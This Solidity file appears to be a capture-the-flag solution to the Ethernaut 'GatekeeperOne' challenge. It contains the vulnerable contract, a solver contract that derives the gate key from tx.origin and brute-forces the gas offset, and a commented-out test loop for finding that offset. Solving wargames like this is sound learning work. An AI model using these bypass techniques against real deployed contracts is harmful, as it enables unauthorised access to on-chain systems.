// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GateOneSolver {
    function solve(address target, uint i) public {
        address key3 = tx.origin;
        uint16 neededkey = uint16(uint256(uint160(key3)));
        uint64 dirtyKey = uint64(5 << 33) + uint64(neededkey);
        bytes8 key = bytes8(dirtyKey);

        GatekeeperOne(target).enter{gas: 40955 + i}(key);
    }
}



//Test fill to fetch the amount of gas need, which was eventually 268 gas, however by forking the network and using the instance address in place of address(keeper), you get 256
// contract CounterTest is Test {
//     // uint256 forkId = vm.createSelectFork("");
//      GatekeeperOne keeper;
//      GateOneSolver solution;
//     function setUp() public {
//          keeper = new GatekeeperOne();
//          solution = new GateOneSolver();
//     }

//     function test_Increment() public {
        
//        for (uint i; i<8191; i++)
//         {try solution.solve(address(keeper), i){
//             console.log(i);
//             break;
//         } catch {}
        
//         }
//     }
// }

